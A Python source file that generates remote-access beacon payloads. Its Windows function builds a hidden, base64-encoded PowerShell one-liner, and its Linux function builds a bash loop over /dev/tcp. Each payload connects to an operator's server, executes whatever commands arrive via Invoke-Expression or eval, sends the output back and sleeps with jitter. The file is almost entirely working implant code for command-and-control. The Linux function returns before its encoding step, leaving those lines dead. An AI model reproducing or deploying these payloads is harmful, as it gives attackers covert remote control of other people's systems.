import base64

def win(ip, port, delay, jitter):
    parameters = f"""
    $ServerIP = "{ip}"
    $ServerPort = {port}
    $Delay = {delay}
    $Jitter = {jitter}
    """
    code = """function Get-RandomSleepTime {
    param (
        [int]$BaseDelay,
        [int]$Jitter
    )
    $Lower = $BaseDelay - $Jitter
    $Upper = $BaseDelay + $Jitter
    return (Get-Random -Minimum $Lower -Maximum ($Upper + 1))
}

# Beacon to communicate with Agent Server
while ($true) {
    try {
        Write-Host "[$(Get-Date)] Checking in..."

        # Open TCP socket
        $Client = New-Object System.Net.Sockets.TcpClient
        $Client.Connect($ServerIP, $ServerPort)
        $Stream = $Client.GetStream()
        $Reader = New-Object System.IO.StreamReader($Stream)
        $Writer = New-Object System.IO.StreamWriter($Stream)
        $Writer.AutoFlush = $true

        while ($Stream.DataAvailable -or !$Reader.EndOfStream) {
            # Read command from server
            $Command = $Reader.ReadLine()
            Write-Host "Received command: $Command"

            # Execute command and capture output
            try {
                $Output = Invoke-Expression $Command 2>&1 | Out-String
                $Writer.WriteLine($Output)
            } catch {
                $Writer.WriteLine("Error: $($_.Exception.Message)")
            }

            # Send delimiter
            $Writer.WriteLine("ac2delim")
        }

        # Close connection
        $Reader.Close()
        $Writer.Close()
        $Stream.Close()
        $Client.Close()
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }

    # Sleep
    $SleepTime = Get-RandomSleepTime -BaseDelay $Delay -Jitter $Jitter
    Start-Sleep -Seconds $SleepTime
}
    """
    payload = parameters + code
    b64 = base64.b64encode(payload.encode("utf-16")[2:]).decode("utf-8")
    enc_payload = "powershell -nop -w hidden -e " + b64

    return enc_payload

def lin(ip, port, delay, jitter):
    parameters = f"""SERVER_IP="{ip}"
SERVER_PORT={port}
DELAY={delay}
JITTER={jitter}
    """
    code = """# Beacon to communicate with server
while true; do
        # Open socket
        echo "[$(date)] Checking in..."
        exec 5<>/dev/tcp/$SERVER_IP/$SERVER_PORT
        while IFS= read -r -t 1 command <&5; do
                echo "Received command: $command"
                output=$(eval "$command" 2>&1 &)
                wait
                echo "$output" >&5
                echo "ac2delim" >&5
        done

        # Close socket
        exec 5>&-; exec 5<&-

        # Sleep for DELAY +- JITTER
        lower=$(( $DELAY - $JITTER ))
        upper=$(( $DELAY + $JITTER ))
        sleep_time=$(( RANDOM % ($upper - $lower + 1) + $lower ))
        sleep $sleep_time
done
    """
    payload = parameters + code
    return payload
    b64 = base64.b64encode(payload.encode("utf-8")).decode("utf-8")

    return b64